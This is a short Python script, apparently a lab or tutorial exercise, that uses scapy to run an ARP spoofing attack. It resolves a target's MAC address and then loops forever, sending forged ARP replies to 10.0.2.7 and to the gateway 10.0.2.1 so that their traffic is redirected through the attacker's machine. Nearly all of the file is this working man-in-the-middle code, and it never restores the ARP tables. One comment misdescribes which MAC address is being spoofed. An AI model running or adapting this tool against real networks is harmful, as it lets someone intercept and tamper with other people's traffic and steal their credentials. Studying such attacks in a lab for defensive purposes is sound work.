#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # Create an ARP request packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Create a broadcast packet
    arp_request_broadcast = broadcast/arp_request # Combine the broadcast and ARP request packets
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # Send the packet and receive the response
    
    return answered_list[0][1].hwsrc # Get the MAC address from the response


# This script creates an ARP spoofing packet.
# The ARP packet is used to map an IP address to a MAC address in a local area network.
# The ARP packet is used to tell the target machine that the router's ip address is associated with target's MAC address.
# The target machine will then send all its traffic to the attacker's machine instead of the router.
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip) # Get the MAC address of the target machine
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Create an ARP packet
    scapy.send(packet, verbose=False) # Send the packet

sent_packets_count = 0 # Initialize a counter for the number of packets sent

try:
    while True:
        spoof("10.0.2.7", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.7")
        sent_packets_count += 2 # Increment the packet count by 2 for each iteration
        print("\r[+] Sent packets: " + str(sent_packets_count), end="")  # Print the number of packets sent
        time.sleep(2) # Wait for 2 seconds before sending the next packet
    # This script creates an ARP spoofing packet.
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Quitting.")
   